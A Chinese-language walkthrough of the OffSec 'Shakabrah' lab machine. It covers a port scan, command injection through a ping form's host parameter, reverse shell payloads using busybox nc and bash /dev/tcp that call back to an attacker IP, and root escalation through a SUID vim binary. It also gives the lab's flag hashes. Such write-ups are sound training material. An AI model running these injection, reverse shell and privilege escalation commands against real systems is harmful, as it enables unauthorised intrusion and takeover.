# Shakabrah

2024-5-28 https://portal.offsec.com/labs/play

difficulty: easy

## IP

192.168.237.86

## Scan

Open Port -> 22,80

```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 33b96d350bc5c45a86e0261095487782 (RSA)
|   256 a80fa7738302c1978c25bafea5115f74 (ECDSA)
|_  256 fce99ffef9e04d2d76eecadaafc3399e (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
```

先看 80 吧，http://192.168.237.86/ 显示的是一个 ping 功能的页面，输入 127.0.0.1 显示了 ping 的结果，应该此处存在命令执行漏洞：

```
http://192.168.237.86/?host=127.0.0.1|ls

index.php
```

经过测试，发现目标机器只允许 80 端口外联。证明存在漏洞，进行反弹利用，kali 上监听 80 端口：

```
curl -G --data-urlencode 'host=127.0.0.1;busybox nc 192.168.45.231 80 -e /bin/bash' http://192.168.237.86/

curl -G --data-urlencode 'host=127.0.0.1;/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.45.231/8888 0>&1"' http://192.168.237.86/
```

获得了反弹的 shell，使用 python3 升级 tty。

发现 user flag：

```
www-data@shakabrah:/home$ cd dylan/
www-data@shakabrah:/home/dylan$ ls -al
total 28
drwxr-xr-x 3 dylan dylan 4096 Aug 25  2020 .
drwxr-xr-x 3 root  root  4096 Aug 25  2020 ..
lrwxrwxrwx 1 root  root     9 Aug 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 dylan dylan  220 Aug 25  2020 .bash_logout
-rw-r--r-- 1 dylan dylan 3771 Aug 25  2020 .bashrc
drwx------ 3 dylan dylan 4096 Aug 25  2020 .gnupg
-rw-r--r-- 1 dylan dylan  807 Aug 25  2020 .profile
-rw-r--r-- 1 dylan dylan   33 May 28 20:04 local.txt
www-data@shakabrah:/home/dylan$ cat local.txt
c65c0e14a4be83cde64783aacd2cfb0e
```

发现 suid 程序 vim.basic 进行利用,目标系统上有 python3：

```
vim.basic -c ':python3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

得到 root 权限：

```
# id
uid=0(root) gid=33(www-data) groups=33(www-data)
# cd /root
# cat proof.txt
f4dabe75cd6ed4d828d9debf50475355
```
